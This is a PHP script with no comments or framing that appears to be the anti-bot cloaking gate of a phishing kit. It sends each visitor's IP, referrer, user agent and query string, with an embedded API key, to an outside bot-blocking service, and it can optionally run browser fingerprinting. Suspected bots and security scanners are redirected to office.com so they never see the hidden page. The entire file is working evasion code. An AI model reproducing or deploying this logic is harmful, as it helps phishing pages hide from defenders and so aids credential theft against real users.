<?php
//ini_set('error_reporting', 0);
const FailedDestination = 'https://office.com';

const EnableFingerPrint = false;
const EnableAntiBot = true ;

function loadJs($jsCode=''){
    if ($_GET['_js']??false) {
        header('content-type: text/javascript');
        $js = <<<JS
const currentURL = new URL(window.location.href);
const baseURL = `\${currentURL.origin}\${currentURL.pathname}`;
const newURL = `\${baseURL}?_jd=botd`;
import(newURL).then((_b) => _b.load()).then((_b) => _b.detect())
.then((_r) => {
    if (_r.bot) {
        window.history.replaceState({}, '', window.location.href.replace(window.location.hash, ''));
        const form = document.createElement('form');
        form.method = 'post';
        const input = document.createElement('input');
        input.type = 'hidden'; 
        input.name = '_b';
        input.value = '1';
        form.appendChild(input);
        document.body.appendChild(form);
        
        form.submit()
    }
    
    $jsCode
   
}).catch()
JS;

        exit(EnableFingerPrint ? $js : $jsCode);
    }

}

if ($_GET['_jd']??false) {
    header('content-type: text/javascript');
    exit(file_get_contents('https://openfpcdn.io/botd/v1'));
}

if (isset($_POST['_b'])) {
    header('HTTP/1.1 307 Temporary Redirect');
    header('location: ' . FailedDestination);
    exit();
}

if (EnableAntiBot) {
    $ip = getip();
    $ref = getref();
    $ua = getua();
    $data = ($_SERVER["QUERY_STRING"]??false) ? urlencode($_SERVER["QUERY_STRING"]) : "";
    $langua = substr(@$_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2);
    $sourcename = "curl";
    $apikey = "058f2ef974c10761daf1";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://beta-01.botblock.link/api");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);  // Reduced timeout value
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "api=$apikey&ip=$ip&ref=$ref&ua=$ua&data=$data&langua=$langua&sourcename=$sourcename");

    $notbot = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log('Curl error: ' . curl_error($ch));
    }
    curl_close($ch);

    if ($notbot != "1") {
        header("Location: " . FailedDestination);
        die();
    }
}

function getip() {
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"]) && $_SERVER["HTTP_CF_CONNECTING_IP"] != "127.0.0.1" && $_SERVER["HTTP_CF_CONNECTING_IP"] != $_SERVER["SERVER_ADDR"]) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    } elseif (!empty($_SERVER["GEOIP_ADDR"]) && $_SERVER["GEOIP_ADDR"] != "127.0.0.1") {
        return $_SERVER["GEOIP_ADDR"];
    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]) && $_SERVER["HTTP_X_FORWARDED_FOR"] != "127.0.0.1" && $_SERVER["HTTP_X_FORWARDED_FOR"] != $_SERVER["SERVER_ADDR"]) {
        return explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
    } elseif (!empty($_SERVER["HTTP_CLIENT_IP"]) && $_SERVER["HTTP_CLIENT_IP"] != "127.0.0.1" && $_SERVER["HTTP_CLIENT_IP"] != $_SERVER["SERVER_ADDR"]) {
        return $_SERVER["HTTP_CLIENT_IP"];
    } else {
        return $_SERVER["REMOTE_ADDR"];
    }
}

function getref() {
    return empty($_SERVER["HTTP_REFERER"]) ? getenv("HTTP_REFERER") : $_SERVER["HTTP_REFERER"];
}

function getua() {
    return empty($_SERVER["HTTP_USER_AGENT"]) ? getenv("HTTP_USER_AGENT") : $_SERVER["HTTP_USER_AGENT"];
}
